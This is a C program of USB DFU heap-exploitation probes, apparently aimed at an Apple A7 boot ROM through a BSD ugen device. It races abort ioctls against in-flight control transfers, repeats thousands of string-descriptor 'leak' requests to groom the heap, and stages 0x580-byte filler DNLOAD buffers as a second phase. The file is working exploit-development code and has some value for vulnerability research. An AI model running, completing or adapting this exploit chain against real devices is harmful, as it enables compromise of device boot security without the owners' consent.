/* A7 heap-baseline discriminator probes.
 * variant 0: (2,3,0x80) primer, then two probes (control; known dead).
 * variant 1..6: historical single-cancel depths (kept for reference).
 * variant 7+: hammer-cancel 0xC0 primer preceded by N string reads
 *   (baseline compensation sweep), then a sync leak battery.
 */
#include <sys/ioctl.h>
#include <dev/usb/usb.h>
#include <errno.h>
#include <fcntl.h>
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>

#ifndef USB_ABORT_REQUEST
#define USB_ABORT_REQUEST _IO('U', 118)
#endif

static long
now_us(void)
{
	struct timespec ts;

	clock_gettime(CLOCK_MONOTONIC, &ts);
	return (long)ts.tv_sec * 1000000L + ts.tv_nsec / 1000L;
}

static void
set_timeout(int fd, int ms)
{
	(void)ioctl(fd, USB_SET_TIMEOUT, &ms);
}

static void
do_req(int fd, const char *tag, uint8_t rt, uint8_t reqno, uint16_t val,
    uint16_t idx, uint16_t len, int timeout_ms)
{
	struct usb_ctl_request req;
	char data[256];
	long t0, us;
	int rc;

	memset(&req, 0, sizeof(req));
	memset(data, 0, sizeof(data));
	req.ucr_request.bmRequestType = rt;
	req.ucr_request.bRequest = reqno;
	USETW(req.ucr_request.wValue, val);
	USETW(req.ucr_request.wIndex, idx);
	USETW(req.ucr_request.wLength, len);
	req.ucr_data = data;
	set_timeout(fd, timeout_ms);
	t0 = now_us();
	rc = ioctl(fd, USB_DO_REQUEST, &req);
	us = now_us() - t0;
	printf("%-26s r=%d errno=%d actlen=%d %ldus b=%02x%02x%02x%02x %c%c%c%c\n",
	    tag, rc, errno, req.ucr_actlen, us,
	    (unsigned char)data[0], (unsigned char)data[1],
	    (unsigned char)data[2], (unsigned char)data[3],
	    (data[0] > 31 && data[0] < 127) ? data[0] : '.',
	    (data[1] > 31 && data[1] < 127) ? data[1] : '.',
	    (data[2] > 31 && data[2] < 127) ? data[2] : '.',
	    (data[3] > 31 && data[3] < 127) ? data[3] : '.');
}

struct async_ctx {
	int fd;
	volatile int started;
	volatile int done;
	int ret;
	int err;
	int actlen;
};

static void *
async_thread(void *arg)
{
	struct async_ctx *ctx = arg;
	struct usb_ctl_request req;
	char data[256];

	memset(&req, 0, sizeof(req));
	req.ucr_request.bmRequestType = 0x80;
	req.ucr_request.bRequest = 6;
	USETW(req.ucr_request.wValue, 0x0304);
	USETW(req.ucr_request.wIndex, 0x040a);
	USETW(req.ucr_request.wLength, 0xc0);
	req.ucr_data = data;
	ctx->started = 1;
	ctx->ret = ioctl(ctx->fd, USB_DO_REQUEST, &req);
	ctx->err = errno;
	ctx->actlen = req.ucr_actlen;
	ctx->done = 1;
	return NULL;
}

/* Reference-form primer: hammer aborts from thread start; the first
 * abort that lands in flight cancels the transfer close to its actual
 * submission, like the reference 10 us deadline. */
static unsigned
stall_hammer(int fd)
{
	struct async_ctx ctx;
	pthread_t th;
	long t_all;
	unsigned cancel_us = 0;

	memset(&ctx, 0, sizeof(ctx));
	ctx.fd = fd;
	set_timeout(fd, 5000);
	if (pthread_create(&th, NULL, async_thread, &ctx) != 0)
		return 0;
	while (!ctx.started)
		;
	t_all = now_us();
	while (now_us() - t_all < 3000) {
		(void)ioctl(fd, USB_ABORT_REQUEST);
		if (ctx.done) {
			cancel_us = (unsigned)(now_us() - t_all);
			break;
		}
	}
	while (!ctx.done)
		;
	pthread_join(th, NULL);
	printf("[B3] hammer cancel@%uus ret=%d errno=%d actlen=%d\n",
	    cancel_us, ctx.ret, ctx.err, ctx.actlen);
	return cancel_us;
}

/* Count how many sync leaks the ROM answers with data before it dies. */
static void
battery(int fd, int count)
{
	int i;

	for (i = 0; i < count; i++) {
		char tag[32];

		snprintf(tag, sizeof(tag), "[L] leak #%d", i);
		do_req(fd, tag, 0x80, 6, 0x0304, 0x040a, 0x40, 100);
	}
}

/* Reference phase-1 replica: prelude, hammer primer, the full leak run. */
static int
phase1_replica(int fd)
{
	int i, dead = 0;

	for (i = 0; i < 4; i++)
		do_req(fd, "[P1] prelude", 0x80, 6, 0x0304, 0x040a, 0x40, 100);
	stall_hammer(fd);
	for (i = 0; i < 7936; i++) {
		char tag[32];

		snprintf(tag, sizeof(tag), "[L] leak %d", i);
		set_timeout(fd, 100);
		errno = 0;
		{
			struct usb_ctl_request req;
			char data[64];
			int rc;

			memset(&req, 0, sizeof(req));
			req.ucr_request.bmRequestType = 0x80;
			req.ucr_request.bRequest = 6;
			USETW(req.ucr_request.wValue, 0x0304);
			USETW(req.ucr_request.wIndex, 0x040a);
			USETW(req.ucr_request.wLength, 0x40);
			req.ucr_data = data;
			rc = ioctl(fd, USB_DO_REQUEST, &req);
			if (rc != 0 && ++dead > 8) {
				printf("[L] heap lost at leak %d (errno=%d)\n", i, errno);
				return -1;
			}
			if (rc == 0)
				dead = 0;
		}
	}
	do_req(fd, "[L] no_leak", 0x80, 6, 0x0304, 0x040a, 0x41, 100);
	printf("[P1] phase 1 replica complete\n");
	return 0;
}

struct dn_ctx {
	int fd;
	volatile int started;
	volatile int done;
	int ret;
	int err;
};

static void *
dn_thread(void *arg)
{
	struct dn_ctx *c = arg;
	struct usb_ctl_request req;
	static char buf[0x800];

	memset(&req, 0, sizeof(req));
	req.ucr_request.bmRequestType = 0x21;
	req.ucr_request.bRequest = 1;
	USETW(req.ucr_request.wValue, 0);
	USETW(req.ucr_request.wIndex, 0);
	USETW(req.ucr_request.wLength, 0x800);
	req.ucr_data = buf;
	c->started = 1;
	c->ret = ioctl(c->fd, USB_DO_REQUEST, &req);
	c->err = errno;
	c->done = 1;
	return NULL;
}

/* Hammer-cancel a 0x800 DNLOAD, optionally after a wire delay. */
static void
abort_dnload(int fd, unsigned delay_us)
{
	struct dn_ctx c;
	pthread_t th;
	long t0;

	memset(&c, 0, sizeof(c));
	c.fd = fd;
	set_timeout(fd, 5000);
	if (pthread_create(&th, NULL, dn_thread, &c) != 0)
		return;
	while (!c.started)
		;
	t0 = now_us();
	while (now_us() - t0 < delay_us)
		;
	while (!c.done)
		(void)ioctl(fd, USB_ABORT_REQUEST);
	pthread_join(th, NULL);
	printf("[S] abort-dnload(delay=%uus) r=%d errno=%d %ldus\n",
	    delay_us, c.ret, c.err, now_us() - t0);
}

/* Phase-2 staging matrix on a heap that phase 1 shaped correctly. */
static void
phase2_matrix(int fd)
{
	static char filler[0x580];

	memset(filler, 'A', sizeof(filler));
	abort_dnload(fd, 0);
	do_req(fd, "[S] filler (0,0) 0x580", 0, 0, 0, 0, 0x580, 10);
	do_req(fd, "[S] filler DNLOAD 0x580", 0x21, 1, 0, 0, 0x580, 100);
	do_req(fd, "[S] clr", 0x21, 4, 0, 0, 0, 100);
	abort_dnload(fd, 0);
	do_req(fd, "[S] filler (0,0) 0x580 #2", 0, 0, 0, 0, 0x580, 10);
	do_req(fd, "[S] clr #2", 0x21, 4, 0, 0, 0, 100);
}

int
main(int argc, char **argv)
{
	int fd, variant, i;

	if (argc < 3) {
		fprintf(stderr, "usage: %s /dev/ugenN.00 variant\n", argv[0]);
		return 2;
	}
	fd = open(argv[1], O_RDWR);
	if (fd < 0) {
		perror("open");
		return 2;
	}
	variant = atoi(argv[2]);
	printf("=== variant %d ===\n", variant);

	switch (variant) {
	case 0:
		/* Reference primer with no prelude (control). */
		do_req(fd, "[A] devdesc", 0x80, 6, 0x0100, 0, 18, 100);
		do_req(fd, "[B]  stall (2,3,0x80)", 0x02, 3, 0, 0x80, 0, 10);
		do_req(fd, "[C1] leak after", 0x80, 6, 0x0304, 0x040a, 0x40, 100);
		do_req(fd, "[C2] devdesc after", 0x80, 6, 0x0100, 0, 18, 100);
		break;
	case 1:
		/* Hammer primer plus the battery. */
		stall_hammer(fd);
		battery(fd, 24);
		break;
	default:
		/* Phase-2 laboratory: reference phase-1 replica, then the
		 * staging matrix. */
		if (phase1_replica(fd) == 0)
			phase2_matrix(fd);
		break;
	}

	return 0;
}
